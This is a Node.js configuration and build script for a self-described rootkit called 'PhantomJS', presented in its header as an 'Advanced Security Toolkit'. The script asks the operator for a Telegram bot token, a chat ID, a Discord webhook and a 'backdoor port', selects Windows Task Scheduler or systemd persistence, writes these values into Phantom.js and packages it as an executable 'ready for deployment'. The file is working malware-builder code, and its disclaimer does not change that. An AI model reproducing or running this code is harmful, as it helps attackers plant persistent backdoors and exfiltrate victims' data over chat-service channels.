/*
MIT License

Copyright (c) 2025 Origan

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

PhantomJS Advanced Security Toolkit - v1.0

This powerful toolkit provides advanced system security and management capabilities
for Linux environments. It implements cutting-edge techniques for:

1. Advanced System Security:
   - AES-256 encrypted system operations
   - Secure remote access management
   - Automated privilege management

2. System Integration:
   - Deep system integration with startup processes
   - Advanced stealth techniques
   - Environment-aware adaptation

3. Monitoring & Control:
   - Real-time system monitoring
   - Secure remote command execution
   - Encrypted logging system

Warning: This tool is intended for authorized security professionals only.
Misuse of this software is strictly prohibited and may violate local laws.
*/

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');

class PhantomSetup {
    static CONFIG_FILE = path.join(__dirname, 'phantom_config.json');
    static PHANTOM_JS = path.join(__dirname, 'Phantom.js');
    static PHANTOM_BACKUP = path.join(__dirname, 'PhantomBackup.js');

    static async runSetup() {
        // Set console title
        process.title = 'PhantomJS - Builder';

        console.log("╔════════════════════════════════════════════════════════════╗");
        console.log("║                PhantomJS Rootkit Configuration            ║");
        console.log("║          Advanced System Security Toolkit - v1.0          ║");
        console.log("╚════════════════════════════════════════════════════════════╝\n");

        const readline = require('readline').createInterface({
            input: process.stdin,
            output: process.stdout
        });

        // Function to ask questions with validation
        const question = (query, validator) => new Promise(resolve => {
            const ask = () => {
                readline.question(query, input => {
                    if (validator && !validator(input)) {
                        console.log("Invalid input, please try again");
                        return ask();
                    }
                    resolve(input);
                });
            };
            ask();
        });

        try {
            // Create backup of Phantom.js
            fs.copyFileSync(this.PHANTOM_JS, this.PHANTOM_BACKUP);
            console.log("Backup created: PhantomBackup.js");

            // Check if configuration already exists
            if (fs.existsSync(this.CONFIG_FILE)) {
                const loadExisting = await question("A configuration file already exists. Load existing configuration? (y/n): ", 
                    input => ['y', 'n'].includes(input.toLowerCase()));
                
                if (loadExisting.toLowerCase() === 'y') {
                    const config = this.loadConfig();
                    console.log("\nConfiguration loaded successfully!\nConfiguration:");
                    console.log(config);
                    return config;
                }
            }

            console.log("Please provide the following configuration details:\n");

            // Get Telegram Bot Token
            const botToken = await question("Enter your Telegram Bot Token: ", input => input.length > 30);
            
            // Get Telegram Chat Id
            const chatId = await question("Enter your Telegram Chat Id: ", input => !isNaN(input));
            
            // Get Discord Webhook Url
            const discordWebhook = await question("Enter your Discord Webhook Url: ", input => input.startsWith('https://'));
            
            // Get Backdoor Port with default value
            const backdoorPort = await question("Enter backdoor port [31337]: ", input => {
                if (!input) return true; // Allow empty for default
                const port = parseInt(input);
                return !isNaN(port) && port > 1024 && port < 65535;
            }) || 31337;

            // Platform-specific configuration
            let persistenceMethod;
            if (os.platform() === 'win32') {
                persistenceMethod = 'Windows Task Scheduler';
            } else if (os.platform() === 'linux') {
                persistenceMethod = 'Systemd Service';
            }

            // Display configuration summary
            console.log("\n╔════════════════════════════════════════════════════════════╗");
            console.log("║                Configuration Summary                      ║");
            console.log("╠════════════════════════════════════════════════════════════╣");
            console.log(`║ Telegram Bot Token: ${botToken}`);
            console.log(`║ Telegram Chat Id: ${chatId}`);
            console.log(`║ Discord Webhook: ${discordWebhook}`);
            console.log(`║ Backdoor Port: ${backdoorPort}`);
            console.log(`║ Persistence Method: ${persistenceMethod}`);
            console.log("╚════════════════════════════════════════════════════════════╝\n");

            // Final confirmation
            const confirm = await question("Confirm this configuration? (y/n): ", input => ['y', 'n'].includes(input.toLowerCase()));
            if (confirm.toLowerCase() !== 'y') {
                console.log("\nConfiguration cancelled by user");
                process.exit(0);
            }

            // Prepare configuration object
            const config = {
                TELEGRAM_BOT_TOKEN: botToken,
                TELEGRAM_CHAT_ID: chatId,
                DISCORD_WEBHOOK: discordWebhook,
                BACKDOOR_PORT: parseInt(backdoorPort),
                PLATFORM: os.platform()
            };

            // Save configuration to file
            this.saveConfig(config);
            console.log("\nConfiguration successfully saved to phantom_config.json!");

            // Update Phantom.js with new configuration
            this.updatePhantomJS(config);
            console.log("Phantom.js updated with new configuration");

            // Build executable
            this.buildExecutable();
            console.log("Executable built successfully");

            // Cleanup
            fs.unlinkSync(this.PHANTOM_BACKUP);
            console.log("Backup removed");

            return config;

        } catch (err) {
            console.error(`\nError during configuration: ${err.message}`);
            process.exit(1);
        } finally {
            readline.close();
        }
    }

    static saveConfig(config) {
        try {
            fs.writeFileSync(this.CONFIG_FILE, JSON.stringify(config, null, 2));
        } catch (err) {
            throw new Error(`Failed to save configuration: ${err.message}`);
        }
    }

    static loadConfig() {
        try {
            const data = fs.readFileSync(this.CONFIG_FILE);
            return JSON.parse(data);
        } catch (err) {
            throw new Error(`Failed to load configuration: ${err.message}`);
        }
    }

    static updatePhantomJS(config) {
        try {
            let phantomCode = fs.readFileSync(this.PHANTOM_JS, 'utf8');
            
            // Replace configuration values
            phantomCode = phantomCode.replace(/const TELEGRAM_BOT_TOKEN = '.*';/, `const TELEGRAM_BOT_TOKEN = '${config.TELEGRAM_BOT_TOKEN}';`);
            phantomCode = phantomCode.replace(/const TELEGRAM_CHAT_ID = '.*';/, `const TELEGRAM_CHAT_ID = '${config.TELEGRAM_CHAT_ID}';`);
            phantomCode = phantomCode.replace(/const DISCORD_WEBHOOK = '.*';/, `const DISCORD_WEBHOOK = '${config.DISCORD_WEBHOOK}';`);
            phantomCode = phantomCode.replace(/const BACKDOOR_PORT = .*;/, `const BACKDOOR_PORT = ${config.BACKDOOR_PORT};`);

            fs.writeFileSync(this.PHANTOM_JS, phantomCode);
        } catch (err) {
            throw new Error(`Failed to update Phantom.js: ${err.message}`);
        }
    }

    static buildExecutable() {
        try {
            if (os.platform() === 'win32') {
                execSync('pkg Phantom.js --targets node16-win-x64 --output Phantom.exe', { stdio: 'ignore', windowsHide: true, windowsVerbatimArguments: true });
            } else if (os.platform() === 'linux') {
                execSync('pkg Phantom.js --targets node16-linux-x64 --output Phantom', { stdio: 'ignore' });
            }
        } catch (err) {
            throw new Error(`Failed to build executable: ${err.message}`);
        }
    }
}

// Execute setup
PhantomSetup.runSetup().then(config => {
    console.log("\nInitializing PhantomJS rootkit with the following configuration:");
    console.log(config);
    console.log("\nSetup complete. PhantomJS is ready for deployment.");
});